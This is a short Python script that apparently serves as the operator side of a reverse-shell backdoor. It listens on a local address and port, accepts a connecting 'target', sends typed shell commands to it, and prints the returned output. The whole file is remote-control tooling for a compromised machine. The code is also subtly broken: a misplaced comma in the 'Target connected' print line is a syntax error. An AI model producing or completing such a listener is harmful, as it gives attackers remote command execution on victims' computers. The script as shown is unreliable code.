import sys, socket, json
from termcolor import cprint as cp

def reliable_send(data):
    jsondata = json.dumps(data)
    target.send(jsondata.encode())

def reliable_recv():
    data = ""
    while True:
        try:
            data = data + target.recv(1024).decode().strip()
            return json.loads(data)
        except ValueError:
            continue


def target_communication():
    while True:
        command = input("* Shell~%s: " % str(ip))
        reliable_send(command)
        if command == "quit":
            break
        else:
            result = reliable_recv()
            cp(result, "blue")

sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
sock.bind(("192.168.178.132", 5555))
cp("[~] Listening for incomming connections:","yellow")

sock.listen(5)
target, ip = sock.accept()
cp("[+] Target connected from: %s", % str(ip))

target_communication()
